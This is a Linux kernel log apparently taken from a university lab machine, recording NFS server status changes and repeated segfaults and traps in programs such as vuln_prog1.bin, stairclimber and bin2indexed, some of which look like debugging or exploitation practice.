[2679630.158836] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.159450] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.159939] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.160248] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.160535] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.161119] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.161736] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.161775] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.162766] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.167673] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.168451] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.169277] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.169734] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.169754] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.172162] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.173113] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.173780] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.174122] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.174658] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.174856] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.176066] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.177698] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.179704] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.199131] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.207488] nfs: server vader.srcit.stevens-tech.edu OK
[2682375.467532] text2bin[19315]: segfault at 0 ip 00007f9d6d97f454 sp 00007ffc78393be0 error 4 in libc-2.23.so[7f9d6d944000+1c0000]
[2682382.890341] text2bin[19325]: segfault at 0 ip 00007f61abf20454 sp 00007ffd31072ba0 error 4 in libc-2.23.so[7f61abee5000+1c0000]
[2687626.776083] a.out[21633]: segfault at 0 ip 00007f72e6e9dbf7 sp 00007ffc46a8dd68 error 4 in libc-2.23.so[7f72e6df8000+1c0000]
[2687680.150449] a.out[21664]: segfault at 0 ip 00007fb04697abf7 sp 00007ffdc1f1e858 error 4 in libc-2.23.so[7fb0468d5000+1c0000]
[2687921.779162] a.out[21703]: segfault at 0 ip 00007f5aab669bf7 sp 00007ffe087b59e8 error 4 in libc-2.23.so[7f5aab5c4000+1c0000]
[2691162.242366] strin[23556]: segfault at 23c135d40 ip 00007f0770f2bbc6 sp 00007fff3c124f20 error 6 in libc-2.23.so[7f0770edf000+1c0000]
[2691581.595633] strin[23637]: segfault at 206460210 ip 00007f97d73e8bc6 sp 00007ffd0645e810 error 6 in libc-2.23.so[7f97d739c000+1c0000]
[2693044.829595] bin2text[24451]: segfault at c4 ip 00007f458efc1cc0 sp 00007fffeb0e0970 error 4 in libc-2.23.so[7f458ef73000+1c0000]
[2693452.633515] bin2text[24788]: segfault at c4 ip 00007f24dcd10bf7 sp 00007ffc1cdea448 error 4 in libc-2.23.so[7f24dcc6b000+1c0000]
[2694660.594007] traps: vuln_prog1.bin[25496] general protection ip:5647026f8a25 sp:7ffdd2af1e88 error:0 in vuln_prog1.bin[5647026f8000+1000]
[2695633.688052] vuln_prog1.bin[26080]: segfault at 7fffffffc531 ip 00007fffffffc531 sp 00007ffed4cf32b0 error 14
[2695674.483758] vuln_prog1.bin[26090]: segfault at 1 ip 00007fffffffc531 sp 00007fffffffc430 error 6
[2697070.534745] vuln_prog1.bin[27146]: segfault at 1 ip 00007fffffffc531 sp 00007fffffffc430 error 6
[2697254.876670] traps: vuln_prog1.bin[27332] general protection ip:7fffffffc440 sp:7fffffffc430 error:0
[2697599.286193] traps: vuln_prog1.bin[27584] general protection ip:7fffffffc440 sp:7fffffffc430 error:0
[2697685.246922] traps: vuln_prog1.bin[27614] general protection ip:7fffffffc440 sp:7fffffffc430 error:0
[2697951.111168] ptrace of pid 27867 was attempted by: gdb (pid 27942)
[2698106.888758] ptrace of pid 27984 was attempted by: gdb (pid 28008)
[2698503.644458] a.out[28438]: segfault at 1 ip 00007f545fd14cc0 sp 00007ffee5caee10 error 4 in libc-2.23.so[7f545fcc6000+1c0000]
[2698599.668022] bin2indexed[28560]: segfault at 1a950a0 ip 00007fcfd22893ef sp 00007ffd19784f68 error 4 in libc-2.23.so[7fcfd21fa000+1c0000]
[2698880.625830] bin2indexed[28772]: segfault at 18 ip 00007f72a39d33c6 sp 00007ffd251df660 error 4 in libc-2.23.so[7f72a3955000+1c0000]
[2699046.317672] bin2indexed[28802]: segfault at 165fa51 ip 00007efe23183470 sp 00007ffc016510a0 error 4 in libc-2.23.so[7efe23105000+1c0000]
[2699094.403712] bin2indexed[28824]: segfault at 18 ip 00007fc1b20033c6 sp 00007fff20e55600 error 4 in libc-2.23.so[7fc1b1f85000+1c0000]
[2699889.949403] traps: vuln_prog1.bin[29062] general protection ip:7fffffffc440 sp:7fffffffc430 error:0
[2700083.569752] vuln_prog1.bin[29263]: segfault at 7fffffffc440 ip 00007fffffffc440 sp 00007ffd6a5e1730 error 14
[2700089.230291] traps: vuln_prog1.bin[29265] general protection ip:7fffffffc440 sp:7fffffffc430 error:0
[2700101.130965] vuln_prog1.bin[29270]: segfault at 5555555549a0 ip 00005555555549a0 sp 00007fff9c2b9af0 error 14 in vuln_prog1.bin[55ecf0572000+1000]
[2703001.803288] traps: vuln_prog1.bin[31119] trap invalid opcode ip:7fffffffc488 sp:7fffffffc430 error:0
[2703009.551037] traps: vuln_prog1.bin[31190] trap invalid opcode ip:7fffffffc488 sp:7fffffffc430 error:0
[2703161.632653] traps: vuln_prog1.bin[31313] trap invalid opcode ip:7fffffffc41c sp:7fffffffc430 error:0
[2703436.047527] traps: vuln_prog1.bin[31380] trap invalid opcode ip:7fffffffc48b sp:7fffffffc430 error:0
[2703811.466300] vuln_prog1.bin[31655]: segfault at 7fffffffc4a0 ip 00007fffffffc4a0 sp 00007ffe4c710650 error 14
[2704458.766174] bin2indexed[31845]: segfault at fd5000 ip 00007f8d7b5a33ef sp 00007ffe78b361b8 error 4 in libc-2.23.so[7f8d7b514000+1c0000]
[2704537.904592] bin2indexed[31874]: segfault at 17e4000 ip 0000000000400b1c sp 00007ffc499c7d60 error 4 in bin2indexed[400000+1000]
[2705104.301768] bin2indexed[32113]: segfault at f10000 ip 0000000000400b1c sp 00007ffc5c25a8b0 error 4 in bin2indexed[400000+1000]
[2705174.404839] bin2indexed[32144]: segfault at 1410000 ip 0000000000400b1f sp 00007fffa4db87f0 error 4 in bin2indexed[400000+1000]
[2705188.858261] bin2indexed[32153]: segfault at 254b000 ip 0000000000400b1f sp 00007ffc20321bf0 error 4 in bin2indexed[400000+1000]
[2705298.589133] bin2indexed[32180]: segfault at fed000 ip 0000000000400b1f sp 00007ffc8ffacff0 error 4 in bin2indexed[400000+1000]
[2705324.676021] bin2indexed[32190]: segfault at 1d79000 ip 0000000000400b1f sp 00007ffd1f8778d0 error 4 in bin2indexed[400000+1000]
[2705563.331558] bin2indexed[32637]: segfault at 101e000 ip 0000000000400b1f sp 00007ffcd43ece10 error 4 in bin2indexed[400000+1000]
[2711907.716781] bin2indexed[3404]: segfault at 193ff20 ip 00007fc699c663ef sp 00007ffd3ce4b328 error 4 in libc-2.23.so[7fc699bd7000+1c0000]
[2719756.590993] vuln_prog1.bin[6406]: segfault at 5555555549a0 ip 00005555555549a0 sp 00007ffe3a3f8d90 error 14 in vuln_prog1.bin[55de14961000+1000]
[2768469.775599] vuln_prog1.bin[22482]: segfault at 5555555549a4 ip 00005555555549a4 sp 00007ffc5ab64a60 error 14 in vuln_prog1.bin[55e770804000+1000]
[2768601.333611] vuln_prog1.bin[22680]: segfault at 5555555549a0 ip 00005555555549a0 sp 00007ffcaf0e5fa0 error 14 in vuln_prog1.bin[55a105474000+1000]
[2768676.743942] vuln_prog1.bin[22793]: segfault at 5555555549a0 ip 00005555555549a0 sp 00007ffc90b701a0 error 14 in vuln_prog1.bin[562e61c3a000+1000]
[2768720.711175] vuln_prog1.bin[22874]: segfault at 5555555549a4 ip 00005555555549a4 sp 00007fffe4c06130 error 14 in vuln_prog1.bin[561894c42000+1000]
[2768742.286659] bin2indexed[22899]: segfault at b72000 ip 00000000004009c6 sp 00007ffeec451ba0 error 4 in bin2indexed[400000+1000]
[2771484.678930] vuln_prog2.bin[24189]: segfault at 1 ip 00007ffff7a98746 sp 00007fffffffde48 error 4 in libc-2.23.so[7ffff7a0d000+1c0000]
[2774930.261805] testReader[25699]: segfault at ffffffffffffffff ip 0000000000400078 sp 00007ffcfc72faf0 error 5 in testReader[400000+1000]
[2775028.571659] testReader[25737]: segfault at ffffffffffffffff ip 0000000000400078 sp 00007ffe10a05ac0 error 5 in testReader[400000+1000]
[2777987.088921] a.out[27583]: segfault at 7ffcfb404f98 ip 0000000000400af5 sp 00007ffcfb404fa0 error 6 in a.out[400000+1000]
[2778444.444881] testReader2[27849]: segfault at ffffffffffffff99 ip 000000000040008a sp 00007ffdddac0b00 error 5 in testReader2[400000+1000]
[2778780.631308] testReader2[28083]: segfault at 1111199 ip 000000000040008a sp 00007ffd2d463650 error 4 in testReader2[400000+1000]
[2779081.407687] testReader2[28167]: segfault at 11111a1 ip 000000000040008a sp 00007ffeffea4d30 error 4 in testReader2[400000+1000]
[2779134.977816] testReader2[28179]: segfault at 11111a1 ip 000000000040008a sp 00007fff75e44770 error 4 in testReader2[400000+1000]
[2779628.746555] testReader2[28493]: segfault at 1111199 ip 000000000040008a sp 00007fffe62610c0 error 4 in testReader2[400000+1000]
[2779716.948485] bin2indexed[28541]: segfault at 151e218 ip 0000000000400b4c sp 00007fffe27e8c80 error 4 in bin2indexed[400000+1000]
[2779732.651300] bin2indexed[28546]: segfault at 1cb7218 ip 0000000000400b4c sp 00007ffd55515530 error 4 in bin2indexed[400000+1000]
[2779850.834004] bin2indexed[28571]: segfault at d4c218 ip 0000000000400b4c sp 00007ffe3c48af80 error 4 in bin2indexed[400000+1000]
[2781558.862670] hello[29808]: segfault at 4000b0 ip 00000000004000b0 sp 00007ffcf69cc4e0 error 15 in hello[400000+1000]
[2803480.769018] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2804208.743390] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2804208.743448] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2804208.743463] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2804208.743487] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2804208.743500] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2804888.238282] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2804948.213514] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2805020.620499] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2805061.803953] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2805064.811943] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2805814.465987] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2806042.590975] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2806389.194412] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2807261.694830] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2807615.114139] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2815011.463894] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2815088.486901] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2815190.517563] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2816089.353514] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2816144.152690] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2871594.384646] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2871725.087044] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2871908.132704] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2943396.432659] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2944163.462352] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2977414.346880] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[3023652.708959] nfs: server vader.srcit.stevens-tech.edu OK
[3023652.709105] nfs: server vader.srcit.stevens-tech.edu OK
[3023652.709413] nfs: server vader.srcit.stevens-tech.edu OK
[3023652.709469] nfs: server vader.srcit.stevens-tech.edu OK
[3023652.709552] nfs: server vader.srcit.stevens-tech.edu OK
[3023652.709593] nfs: server vader.srcit.stevens-tech.edu OK
[3023652.709638] nfs: server vader.srcit.stevens-tech.edu OK
[3023652.709676] nfs: server vader.srcit.stevens-tech.edu OK
[3023652.710019] nfs: server vader.srcit.stevens-tech.edu OK
[3023652.710098] nfs: server vader.srcit.stevens-tech.edu OK
[3023652.710442] nfs: server vader.srcit.stevens-tech.edu OK
[3023652.710496] nfs: server vader.srcit.stevens-tech.edu OK
[3023652.710509] nfs: server vader.srcit.stevens-tech.edu OK
[3023652.710590] nfs: server vader.srcit.stevens-tech.edu OK
[3023652.710602] nfs: server vader.srcit.stevens-tech.edu OK
[3023652.710629] nfs: server vader.srcit.stevens-tech.edu OK
[3023652.710998] nfs: server vader.srcit.stevens-tech.edu OK
[3023652.712063] nfs: server vader.srcit.stevens-tech.edu OK
[3023652.713490] nfs: server vader.srcit.stevens-tech.edu OK
[3023652.715420] nfs: server vader.srcit.stevens-tech.edu OK
[3023652.715598] nfs: server vader.srcit.stevens-tech.edu OK
[3023652.716037] nfs: server vader.srcit.stevens-tech.edu OK
[3023652.716850] nfs: server vader.srcit.stevens-tech.edu OK
[3023652.718825] nfs: server vader.srcit.stevens-tech.edu OK
[3023652.718873] nfs: server vader.srcit.stevens-tech.edu OK
[3023652.719648] nfs: server vader.srcit.stevens-tech.edu OK
[3023652.720872] nfs: server vader.srcit.stevens-tech.edu OK
[3027672.363815] traps: vuln_prog2.bin[5805] general protection ip:5555555549fa sp:7fffffffc638 error:0 in vuln_prog2.bin[555555554000+1000]
[3027887.251532] traps: vuln_prog2.bin[5889] trap invalid opcode ip:7fffffffc4e2 sp:7fffffffc640 error:0
[3041457.692550] traps: vuln_prog2.bin[11185] general protection ip:7ffff7a5bcc0 sp:7fffffffbea0 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3049920.517413] stairclimber[26200]: segfault at 0 ip 00000000004014fe sp 00007ffe5a86f200 error 4 in stairclimber[400000+6000]
[3061085.736200] stairclimber[30589]: segfault at 0 ip 000000000040152a sp 00007ffd98e712d0 error 4 in stairclimber[400000+6000]
[3061085.900582] stairclimber[30593]: segfault at 0 ip 000000000040152a sp 00007ffca922d390 error 4 in stairclimber[400000+6000]
[3061086.057804] stairclimber[30597]: segfault at 0 ip 000000000040152a sp 00007ffd475334c0 error 4 in stairclimber[400000+6000]
[3061086.220846] stairclimber[30601]: segfault at 0 ip 000000000040152a sp 00007ffd09b76b00 error 4 in stairclimber[400000+6000]
[3061086.385781] stairclimber[30605]: segfault at 0 ip 000000000040152a sp 00007ffc2a87c080 error 4 in stairclimber[400000+6000]
[3061086.534173] stairclimber[30609]: segfault at 0 ip 000000000040152a sp 00007ffce5362300 error 4 in stairclimber[400000+6000]
[3061320.003437] stairclimber[30683]: segfault at 0 ip 0000000000401531 sp 00007ffcf3053120 error 4 in stairclimber[400000+6000]
[3061320.163131] stairclimber[30687]: segfault at 0 ip 0000000000401531 sp 00007ffcad1064d0 error 4 in stairclimber[400000+6000]
[3061320.312150] stairclimber[30691]: segfault at 0 ip 0000000000401531 sp 00007ffcf273ff90 error 4 in stairclimber[400000+6000]
[3061320.461884] stairclimber[30695]: segfault at 0 ip 0000000000401531 sp 00007ffeb2ea6d30 error 4 in stairclimber[400000+6000]
[3061320.587382] stairclimber[30699]: segfault at 0 ip 0000000000401531 sp 00007ffc4597fc10 error 4 in stairclimber[400000+6000]
[3061320.748673] stairclimber[30703]: segfault at 0 ip 0000000000401531 sp 00007ffeb24a5bc0 error 4 in stairclimber[400000+6000]
[3069735.707137] traps: testReaderLite2[1309] trap invalid opcode ip:4000b6 sp:7fffc4047aa0 error:0 in testReaderLite2[400000+1000]
[3069806.231661] traps: testReaderLite2[1324] trap invalid opcode ip:4000b6 sp:7ffe1208b410 error:0 in testReaderLite2[400000+1000]
[3069951.694345] traps: testReaderLite2[1375] trap invalid opcode ip:4000b6 sp:7ffcac7862c0 error:0 in testReaderLite2[400000+1000]
[3070058.913235] traps: testReaderLite2[1404] trap invalid opcode ip:4000b6 sp:7ffd2fd30d90 error:0 in testReaderLite2[400000+1000]
[3070098.226378] traps: testReaderLite2[1417] trap invalid opcode ip:4000b6 sp:7ffda84999e0 error:0 in testReaderLite2[400000+1000]
[3080039.609053] vuln_prog1.bin[5139]: segfault at 100 ip 00007fffffffdc10 sp 00007fffffffdc60 error 4
[3080056.870663] vuln_prog1.bin[5144]: segfault at 100 ip 00007fffffffdc10 sp 00007fffffffdc60 error 4
[3080151.257808] vuln_prog1.bin[5181]: segfault at 100 ip 00007fffffffdc10 sp 00007fffffffdc60 error 4
[3080386.585825] vuln_prog1.bin[5230]: segfault at 49 ip 00007fffffffdc10 sp 00007fffffffdc60 error 4
[3080397.000065] vuln_prog1.bin[5232]: segfault at 100 ip 00007fffffffdc10 sp 00007fffffffdc60 error 4
[3081240.216543] vuln_prog1.bin[5414]: segfault at 100 ip 00007fffffffdc10 sp 00007fffffffdc60 error 4
[3112776.569383] vuln_prog1.bin[14704]: segfault at 100 ip 00007fffffffdc10 sp 00007fffffffdc60 error 4
[3115526.573251] traps: vuln_prog1.bin[15740] general protection ip:555555554a25 sp:7fffffffc428 error:0 in vuln_prog1.bin[555555554000+1000]
[3117658.715421] ptrace of pid 16825 was attempted by: gdb (pid 16993)
[3127330.252428] traps: vuln_prog1.bin[21302] general protection ip:555555554a25 sp:7fffffffdc58 error:0 in vuln_prog1.bin[555555554000+1000]
[3127845.021783] traps: vuln_prog1.bin[21670] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3139134.102988] traps: vuln_prog1.bin[26101] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3139188.332678] traps: vuln_prog1.bin[26261] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3139727.518505] traps: vuln_prog1.bin[26371] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3139963.153328] traps: vuln_prog1.bin[26479] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3140021.633936] traps: vuln_prog1.bin[26490] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3140334.044456] traps: vuln_prog1.bin[26544] general protection ip:555555554a25 sp:7fffffffdc68 error:0 in vuln_prog1.bin[555555554000+1000]
[3141371.053820] traps: vuln_prog1.bin[26891] general protection ip:555555554a25 sp:7fffffffdc58 error:0 in vuln_prog1.bin[555555554000+1000]
[3141574.639466] traps: vuln_prog1.bin[27166] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3141582.926942] traps: vuln_prog1.bin[27168] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3141585.220062] traps: vuln_prog1.bin[27171] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3141606.156306] traps: vuln_prog1.bin[27181] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3141607.786316] traps: vuln_prog1.bin[27183] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3141645.833075] traps: vuln_prog1.bin[27247] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3141893.456879] traps: vuln_prog1.bin[27466] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3141896.927480] traps: vuln_prog1.bin[27468] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3141917.668949] traps: vuln_prog1.bin[27490] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3141936.108849] traps: vuln_prog1.bin[27541] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3141938.093471] traps: vuln_prog1.bin[27543] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3141963.399698] traps: vuln_prog1.bin[27551] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3141998.546719] traps: vuln_prog1.bin[27560] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3142001.935057] traps: vuln_prog1.bin[27563] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3142034.955779] traps: vuln_prog1.bin[27566] general protection ip:555555554a25 sp:7fffffffdc68 error:0 in vuln_prog1.bin[555555554000+1000]
[3142037.866014] traps: vuln_prog1.bin[27577] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3142041.010298] traps: vuln_prog1.bin[27579] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3142055.814483] traps: vuln_prog1.bin[27586] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3142155.735933] traps: vuln_prog1.bin[27619] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3142219.652789] traps: vuln_prog1.bin[27659] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3142227.743543] traps: vuln_prog1.bin[27661] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3143761.431574] vuln_prog2.bin[28543]: segfault at 1 ip 00007ffff7a98746 sp 00007fffffffde48 error 4 in libc-2.23.so[7ffff7a0d000+1c0000]
[3144069.121235] vuln_prog1.bin[28665]: segfault at 100 ip 00007fffffffdc10 sp 00007fffffffdc60 error 4
[3147214.208259] passwd-4[30925]: segfault at 4000c4 ip 000000000040008b sp 00007ffc2bf22a10 error 7 in passwd-4[400000+1000]
[3150608.549496] traps: vuln_prog1.bin[32431] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3150699.538848] traps: vuln_prog1.bin[32466] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3150710.056350] traps: vuln_prog1.bin[32471] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3150724.641537] traps: vuln_prog1.bin[32497] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3150782.704037] traps: vuln_prog1.bin[32578] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3150794.170418] traps: vuln_prog1.bin[32581] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3150840.370729] traps: vuln_prog1.bin[32662] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3150842.910643] traps: vuln_prog1.bin[32665] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3150845.072129] traps: vuln_prog1.bin[32667] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3151654.202239] traps: vuln_prog1.bin[616] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3151668.799604] traps: vuln_prog1.bin[621] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3151770.797208] traps: vuln_prog1.bin[836] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3151779.229253] traps: vuln_prog1.bin[908] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3151841.659935] traps: vuln_prog1.bin[928] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3151851.351239] traps: vuln_prog1.bin[932] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3152116.083508] traps: vuln_prog1.bin[1014] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3152118.633172] traps: vuln_prog1.bin[1020] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3184978.038040] SGI XFS with ACLs, security attributes, realtime, no debug enabled
[3184978.069179] JFS: nTxBlock = 8192, nTxLock = 65536
[3184978.119305] ntfs: driver 2.1.32 [Flags: R/O MODULE].
[3184978.192781] QNX4 filesystem 0.2.3 registered.
[3210946.139599] stairclimber[7963]: segfault at 1801a0ace8 ip 0000000000401ba4 sp 00007ffdddbfacc0 error 4 in stairclimber[400000+6000]
[3210946.297980] stairclimber[7967]: segfault at 1800f04e28 ip 0000000000401ba4 sp 00007ffd30757bd0 error 4 in stairclimber[400000+6000]
[3210946.443758] stairclimber[7971]: segfault at 1801ac6ca8 ip 0000000000401ba4 sp 00007ffef7aaf960 error 4 in stairclimber[400000+6000]
[3210946.588724] stairclimber[7975]: segfault at 18022fd188 ip 0000000000401ba4 sp 00007ffe524d2e70 error 4 in stairclimber[400000+6000]
[3210946.702830] stairclimber[7979]: segfault at 1801879688 ip 0000000000401ba4 sp 00007ffc02a074e0 error 4 in stairclimber[400000+6000]
[3211010.914843] stairclimber[8089]: segfault at 180238ace8 ip 0000000000401ba4 sp 00007ffe303932b0 error 4 in stairclimber[400000+6000]
[3211011.076242] stairclimber[8093]: segfault at 180069ae28 ip 0000000000401ba4 sp 00007ffd45d8c5d0 error 4 in stairclimber[400000+6000]
[3211011.228445] stairclimber[8097]: segfault at 1802437ca8 ip 0000000000401ba4 sp 00007ffef4d4ed80 error 4 in stairclimber[400000+6000]
[3211011.387804] stairclimber[8101]: segfault at 1801076188 ip 0000000000401ba4 sp 00007fffa2327600 error 4 in stairclimber[400000+6000]
[3211011.550074] stairclimber[8105]: segfault at 1801205688 ip 0000000000401ba4 sp 00007ffd790bc270 error 4 in stairclimber[400000+6000]
[3211085.662542] stairclimber[8164]: segfault at 18020c7ce8 ip 0000000000401ba4 sp 00007ffd340ee670 error 4 in stairclimber[400000+6000]
[3211085.826111] stairclimber[8168]: segfault at 1801970e28 ip 0000000000401ba4 sp 00007ffdbac6fa00 error 4 in stairclimber[400000+6000]
[3211085.978544] stairclimber[8172]: segfault at 180191cca8 ip 0000000000401ba4 sp 00007ffc1ab21e00 error 4 in stairclimber[400000+6000]
[3211086.131106] stairclimber[8176]: segfault at 1801091188 ip 0000000000401ba4 sp 00007ffcdff6f450 error 4 in stairclimber[400000+6000]
[3211086.311755] stairclimber[8180]: segfault at 1800a78688 ip 0000000000401ba4 sp 00007ffe9b5a4ba0 error 4 in stairclimber[400000+6000]
[3211318.033048] stairclimber[8388]: segfault at 18007cfce8 ip 0000000000401ba4 sp 00007ffc1aecc540 error 4 in stairclimber[400000+6000]
[3211318.210569] stairclimber[8392]: segfault at 18023dae28 ip 0000000000401ba4 sp 00007ffcfcb01ae0 error 4 in stairclimber[400000+6000]
[3211318.376255] stairclimber[8396]: segfault at 18023adca8 ip 0000000000401ba4 sp 00007fffb92d8f80 error 4 in stairclimber[400000+6000]
[3211318.551845] stairclimber[8401]: segfault at 1801023188 ip 0000000000401ba4 sp 00007fffdd67f6d0 error 4 in stairclimber[400000+6000]
[3211318.707207] stairclimber[8405]: segfault at 1800c23688 ip 0000000000401ba4 sp 00007ffeeee82f10 error 4 in stairclimber[400000+6000]
[3212563.019658] stairclimber[9125]: segfault at 3fffffffc ip 0000000000401372 sp 00007ffe0e3a7130 error 4 in stairclimber[400000+6000]
[3213138.527580] stairclimber[9783]: segfault at 3fffffffc ip 00000000004014af sp 00007ffe09d40340 error 4 in stairclimber[400000+6000]
[3213138.691065] stairclimber[9787]: segfault at 3fffffffc ip 00000000004014af sp 00007fff42928e20 error 4 in stairclimber[400000+6000]
[3213280.631322] stairclimber[9924]: segfault at 3fffffffc ip 0000000000401512 sp 00007ffd1a32a3b0 error 4 in stairclimber[400000+6000]
[3213280.792072] stairclimber[9928]: segfault at 3fffffffc ip 0000000000401512 sp 00007ffe68237680 error 4 in stairclimber[400000+6000]
[3213589.328507] vuln_prog1.bin[10320]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007fff2f1c3120 error 14
[3213594.267599] traps: passs[10322] trap invalid opcode ip:4000c2 sp:7fff8eaabc08 error:0 in passs[400000+1000]
[3213619.716261] stairclimber[10420]: segfault at 3fffffffc ip 00000000004014af sp 00007fff7bea96d0 error 4 in stairclimber[400000+6000]
[3213619.869679] stairclimber[10424]: segfault at 3fffffffc ip 00000000004014af sp 00007ffd2ccdc670 error 4 in stairclimber[400000+6000]
[3213752.706259] stairclimber[10555]: segfault at 3fffffffc ip 00000000004014ad sp 00007ffe85bef300 error 4 in stairclimber[400000+6000]
[3213752.867765] stairclimber[10559]: segfault at 3fffffffc ip 00000000004014ad sp 00007fff28dbba40 error 4 in stairclimber[400000+6000]
[3214367.607796] traps: passs[10738] trap invalid opcode ip:4000c3 sp:7fff7b6f2d98 error:0 in passs[400000+1000]
[3214988.920774] traps: passs[10981] trap invalid opcode ip:4000cd sp:7fff5e157ee8 error:0 in passs[400000+1000]
[3215663.103681] traps: passs[11445] trap invalid opcode ip:4000d0 sp:7ffecd70fe97 error:0 in passs[400000+1000]
[3216487.426316] vuln_prog1.bin[11782]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007ffd7fe079f0 error 14
[3216938.755750] traps: passs[12227] trap invalid opcode ip:4000c6 sp:7ffc24d58990 error:0 in passs[400000+1000]
[3217001.042564] stairclimber[12349]: segfault at 3fffffffc ip 00000000004013ad sp 00007ffccdd73c80 error 4 in stairclimber[400000+6000]
[3217001.213403] stairclimber[12353]: segfault at 3fffffffc ip 00000000004013ad sp 00007ffe597e2880 error 4 in stairclimber[400000+6000]
[3217076.964574] stairclimber[12506]: segfault at 3fffffffc ip 000000000040142d sp 00007ffc93dbed10 error 4 in stairclimber[400000+6000]
[3217077.119231] stairclimber[12510]: segfault at 3fffffffc ip 000000000040142d sp 00007ffe1faf79f0 error 4 in stairclimber[400000+6000]
